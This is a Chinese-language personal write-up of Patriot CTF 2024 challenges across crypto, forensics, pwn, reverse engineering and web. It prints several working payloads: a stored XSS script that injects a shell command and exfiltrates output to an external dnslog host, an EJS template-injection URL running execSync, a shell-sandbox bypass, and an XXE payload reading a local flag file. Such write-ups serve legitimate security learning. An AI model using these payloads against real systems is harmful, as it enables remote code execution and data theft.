# Patriot CTF 2024 Personal Writeup

Lysithea 5176 67th 2024.09.22-23

George Mason University 主办的周末CTF比赛，题量很大，难度分了五个级别（beginner, easy, medium, hard, expert），归类于入门/简单题的占40%（虽然即使是简单题也不一定真的简单），也有两三道压轴难题（Web压轴是一个Apache/PHP，Pwn有一个V8题和一个内核题，Crypto也有一个没看是什么）。高手应该不少，第一日就看到有人专杀难题。比赛专业程度中等，确实比一些高中赛专业，题目基本都共用环境（但没遇到隔离问题），中间下线调整过几次，但不太影响比赛体验。

## Crypto
### idk cipher / bg
简单的换位异或加密。附件里的key就是实际加密用的key。
### bigger is better / bg
e很大（和N同量级）下的RSA解密。找了个[Weiner Attack](https://gist.github.com/mananpal1997/73d07cdc91d58b4eb5c818aaab2d38bd)的code秒了

### bit by bit / ez
循环密钥异或加密，key部分位未知，但明文是有意义的英文，代码写法不太常规。按加密块长度（16字节）分组打印后，根据英文单词特征可以逐个字节还原。原文是一篇讲ENIAC的密码学文章。

## Forensic
### simple exfiltration / ez
给了一个流量包。TCP/HTTP都是正常流量，但容易发现对同一个对象的ICMP的TTL似乎各不相同，而且看起来是ascii值，提取出来就是flag。
```sh
tshark -r ./simple.pcapng -T fields -e "ip.ttl" -Y "icmp"
```
### bad blood / ez / failed
给了一个Windows日志文件（EVTX）。直接打开后发现大量远程Powershell命令执行的条目。用`python-evtx`这个包提取日志并转换为XML，可以把实际被执行的命令拼接出来。

首先下载了两个恶意脚本`Invoke-UrbanBishop`和`Invoke-P0wnedshell`，之后似乎是用长串的base64 + deflate了实际执行的命令。只是Powershell我确实不熟悉，Windows Defender已知报毒，再加上我确实不太敢在真机上搞这种危险脚本，就没做完。逆向那些代码应该不会太难。


### slingshot / nm

> 这个题涉及Python 3.11 pyc逆向，最好和`rev-password protecter`一起看，都用到了`pycdc`工具

这个题也是给了流量包。`10.151.198.69`和`93.132.55.192`之间有一个`GET /download.pyc`的HTTP通信，并且之后有三次TCP通信。

逆向完成后，可以猜出代码读取文件后，和当前时间epoch做了一个循环异或，再发送给对方。我们根据流量包的流量记录和时间戳，可以得到数据，三次TCP通信连起来是一个jpg文件的前半部分，但是足够看到flag了。

#### pycdc 2024.9.23 版本 3.11 BEFORE_WITH opcode处理
不出意外pycdc导出会报错：`Unsupported opcode: BEFORE_WITH`，这是因为目前pycdc还不支持3.11版本，而`BEFORE_WITH`是3.11新加的opcode。用pycdas导出伪汇编进一步分析。

可以看出报错的地方就是一个with打开文件的语句。理论上说被with影响的范围应该很短，但是反编译器在这里直接停了。能不能想办法跨过去继续反编译呢？

在`pycdc`项目的`ASTree.cpp`可以看到处理opcode的分支。我们其实只要加上`BEFORE_WITH`的分支就可以让它不走`default`分支报错。当然我们直接这么加分支大概率是会让结果出错的，但是我们只要保证结果大致是堆栈平衡的，只要出了with区域结果仍然比较可靠。为了增强可信度，我们还可以用3.10版本`python -m compileall`导出旧版本pyc对比分析，就可以知道应该把新指令当成哪个旧指令等价替代了。

在添加了包括`BEFORE_WITH`在内的一些opcode后：
```diff
diff --git a/ASTree.cpp b/ASTree.cpp
index 050eebf..6d68258 100644
--- a/ASTree.cpp
+++ b/ASTree.cpp
@@ -1876,12 +1876,19 @@ PycRef<ASTNode> BuildFromCode(PycRef<PycCode> code, PycModule* mod)
             break;
         case Pyc::SETUP_WITH_A:
         case Pyc::WITH_EXCEPT_START:
+        case Pyc::BEFORE_WITH:
+        case Pyc::PUSH_EXC_INFO:
             {
                 PycRef<ASTBlock> withblock = new ASTWithBlock(pos+operand);
                 blocks.push(withblock);
                 curblock = blocks.top();
             }
             break;
+        case Pyc::RERAISE_A:
+            break;
+        
+        case Pyc::COPY_A:
+            break;
         case Pyc::WITH_CLEANUP:
```
可以成功跑过去，反编译出来的代码大致是这样的：
```py
port = 22993
with open(file, 'rb') as r:
    data_bytes = r.read()
    None(None, None)
with None:
    with None:
        if not None:
            pass
current_time = time.time()
```
反正就是能看了。当然后面还有个迭代器没成功跑出来，不过能猜到结果了，就没管。
```py
Unsupported opcode: RETURN_GENERATOR
encrypt_bytes = (lambda .0: pass# WARNING: Decompyle incomplete
)(zip(key_bytes, data_bytes)())
```

## pwn
### not so shrimple is it / bg
非常单纯的一个strcpy栈溢出ret2text。唯一问题是写入会被0截断，我们事实上需要覆盖返回libc的6个字节，所以需要分三次写，前两次用结尾的0字节覆盖一个高字节。

### navigator / ez
程序提供了读写一个数组的一个字节的功能。栈上整数溢出，atoi没有做负数检查，所以可以向低地址读写。同时写入本身也有数组越界，向高地址也可以写（但读没有越界）。所以整体思路就是用低地址读泄露地址，用高地址写ROP链

### shellcrunch / ez
喜闻乐见的手写shellcode题。这次的限制是：首先检查有没有`/binsh`这几个字符，然后把做一个`s[4*n] ^= s[4*n+1]`这样的异或操作，相当于自带SMC。最后把`s[12*n+2:12*n+6]`的字节改成`\xf4`即`hlt`。因为有自带SMC，所以很容易绕过字符黑名单。最后`hlt`用`jmp`绕过。

### flight script / nm
最新（2.35）堆题，没有PIE，可以增删改，但是每个堆块只能给偏移0处写一个malloc地址，给0x18处写任意8字节（也可以后续修改）。此外同时增加了一个向栈上数组写内容的功能，写入的最大字符数由一个bss的全局变量控制。因此思路是想办法把这个全局变量改大之后打栈溢出。

这个题的0x18偏移很明显对应largebin attack：对于largebin chunk，0x18对应bk_nextsize域。下面代码里，`fwd`是旧堆块，`fwd->bk_nextsize`已经被修改。那么为了保证双链表一致性`victim->bk_nextsize->fd_nextsize = victim`，会导致`victim->bk_nextsize->fd_nextsize == fwd->bk_nextsize + 0x20`的位置被写入为新的堆块地址。因此`fwd->bk_nextsize`应该被改成目标地址-0x20。（注：nextsize双链表也是以chunk头为元素的，叫这个名字只是因为这个链表是用来做大小排序的）

> 根据[这篇博客](https://www.kn0sky.com/?p=398de6d8-9e77-4ac2-a4f6-c6811c2b4c91)，目前的保护需要新插入的largebin是链表中最小的。

```c
else
{
    // nextsize插入节点（双链表中间插入）
    victim->fd_nextsize = fwd;
    victim->bk_nextsize = fwd->bk_nextsize;
    fwd->bk_nextsize = victim;
    victim->bk_nextsize->fd_nextsize = victim;  // 第一个产生任意地址写的地方
}
```

后面栈溢出很常规了，通过GOT表泄露LIBC再回到main，重走一遍流程。

### strings only / hd
为了ban掉tcache强制用2.25的LIBC。附件的二进制程序似乎有花指令，但是给了源码。也是堆题模板，可以增删改查。

增用的calloc，删的时候悬空指针正确置0了，改的时候也没有越界。另外本题FULL RELRO，没有PIE，初始偏移值为0x200000（而不是0x400000）

目标是改一个栈地址为指定值（泄露地址+任意写）。

主要漏洞：

- 位于main函数的打印分支有格式化字符串漏洞（`printf(strings[index])`
- 似乎`add`的过程对数组越界没有检查，可能可以实现`sizes`改为一个bss地址，使得`edit`时可以越界。（没用上）

泄露地址很简单，关键是怎么任意写。这个题tricky点在于格式化字符串在`bss`上而不是栈上，所以没法写地址给它用。不过可以注意到`%6$p`指向`strings[index]`本身，原本是堆地址，把这个地址改成一个bss地址再对它`edit`就可以修改任意bss地址。但是如果不能一次改完，再printf这个地址就会报错，所以我们必须用`f"%{strings_addr}c%6$n"`一次改完（大概输出2MB垃圾数据）。我们选择让它指向另外一个`strings`数组的地址，把它edit成栈地址，这样我们就可以直接edit那个被修改了的字符串了。

## rev
### revioli, revioli, revioli / ez
这个题给的二进制程序会把目标字符串在内存里拼出来，可以gdb下断点之后在内存里搜出来

### password protecter / ez
给了一个3.11的pyc，关于pycdc的问题之前讲过了。反编译之后基本就是一个`lambda c: chr(ord(c) + 1)`加一个循环异或

### Packed Full Of Surprise / ez
给了一个加壳的二进制和输出，要求还原输入。我一开始的做法是还原到开始输入时dump内存。从此时的脱壳代码可以找到几个SHA1 magic number，并且从strace可以看出引入了OpenSSL的库。然后我觉得可能这题可能不用强攻，果然每个明文只会影响一个密文，全爆一遍就出来了

结果从flag发现原来这玩意是UPX壳，`PCTF{UPX_15_2_3A$y_t0_uNp4cK}`，脱壳之后直接可读了，确实是逐个字节加密（流密码？）

### AI? PRNG / ez
同样是根据输出还原输入，同样是流密码。过。

## misc
### Making Baking Pancakes / ez
按要求编程的题，只是单纯的base64解密而已。评价为pwntools练习题

### Really Only Echo / ez
绕过一个shell沙盒。基本的检查有两点：排除了`$()|&;<>`，然后split后不能出现`ls /bin`（echo除外），至少出现一次echo。

但是没有排除`/#`和引号，也就意味着`/bin/bash -c "cat flag.txt" # echo`是合法的命令。

## web
### giraffe notes / ez
给了php源码，加个XFF头就行了。感觉应该放beginner
### open seasame / ez
简单的XSS题。BOT只能访问子网的URL。子网有命令执行权限（也是个简单的shell拼接）的节点需要cookie。但是子网的端口也暴露出来了（没公开，可能是要自己试出来），可以往数据库里存储内容，并且访问时是以`text/html`的MIME访问的。因此可以构造持久XSS。

```html
<script>fetch("/api/cal?modifier=;cat+flag.txt", {
    credentials: "include",
}).then((resp)=>(resp.text())).then((s)=>{
    console.log(s);
    var dnslog = s.slice(213,223).split("").map(c=>c.charCodeAt(0).toString(16)).join(".");
    fetch("http://" + dnslog + ".31f767c0.log.dnslog.biz", {
        mode: "no-cors"
    });
})</script>
```

### impersonate / nm
出的比较乱的一道题。访问flag的endpoint似乎需要session伪造。这个题flask的secret_key是和服务器启动时间有关的常量，而服务器提供了节点暴露出服务器uptime和current_time。注意考虑小数问题有±1秒误差。

### blob / nm
附件特别短
```js
require("express")()
  .set("view engine", "ejs")
  .use((req, res) => res.render("index", { blob: "blob", ...req.query }))
  .listen(3000);
```
从render调用方式可以判断这个题是有模板的。也没什么思路，就随便搜了搜`ejs template injection`，结果搜出了express的[issue](https://github.com/mde/ejs/issues/735)

```
http://127.0.0.1:3000/?name=John&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('calc');
```

但这个洞似乎并不值得给CVE，因为本来就不应该把用户输入可控的`req.query`直接交给EJS的`render`。

再强调一遍，永远不要直接写：`res.render('index', req.query)`

### dogdays / nm
PHP hash绕过，核心是这一句：`if(sha1("TEST SECRET1".$pic)==$hash){`

一开始以为是弱类型，但其实1. 现在PHP不能`"22ab" == "22"`了。2. `0e123`这种科学计数法要求后面全是数字，概率极低。

到很后面我才发现原来网站给了几个示例的hash。那么就可以直接hash extension attack了。可以用`hlextend`库

### domdom / nm
放最后是因为这题花了最多精力，考验意外的处理能力。

这个题给的路径很清晰：能上传图片，只支持jpg和png扩展名，但会在扩展名后加随机数字。能用PIL读已上传图片的辅助信息返回一个字典（包含`image.info.get('Comment')`）。能访问内网，把返回的数据用json解码，取出`Comment`字段，用lxml，带实体解析解码。所以目标就是上传一个带XXE的Comment的图片。

但是PIL的表现就比较幽默了：

- jpg, gif, gbr: 确实会读取comment，但是读的是`self.info['comment']`全小写的
- im: 读的确实是`Comment`，但是默认Comment会有很多条，会塞到一个list里。最后出来的XML最前面是`[`，解析失败。

最后从官方的[PIL所有支持格式](https://pillow.readthedocs.io/en/latest/handbook/image-file-formats.html#iptc-naa)发现，发现EPS作为一个纯文本格式似乎可以指定未定义的Comment字段，于是：

```py
comment = \
f"""<!DOCTYPE b [<!ENTITY xxe SYSTEM  "file:///app/flag.txt">]>
<name>&xxe;</name>""".replace('\n', ' ')

EXAMPLE_EPS = f"""%!PS-Adobe-3.0 EPSF-3.0
%%Creator: PIL 0.1 EpsEncode
%%BoundingBox: 0 0 3 3
%%Pages: 1
%%Comment: {comment}
%%EndComments
%%Page: 1 1
%ImageData: 3 3 8 1 0 1 1 "image"
gsave
10 dict begin
/buf 3 string def
3 3 scale
3 3 8
[3 0 0 -3 0 3]
{{ currentfile buf readhexstring pop }} bind
image
000000000000000000
%%%%EndBinary
grestore end"""
```

PIL读取图片是看图片头内容而不看扩展名的，所以以任何格式传上去都可以。

#### 9.25 update
> 参考[狼组的WP](https://www.ctfiot.com/206569.html):
> 这个题手写报文可以把Host写成任意服务器，所以就完全绕过了它对Host的限制。
> 应该属于非预期。不过目前我手头也没有云服务器所以也确实只能打这个
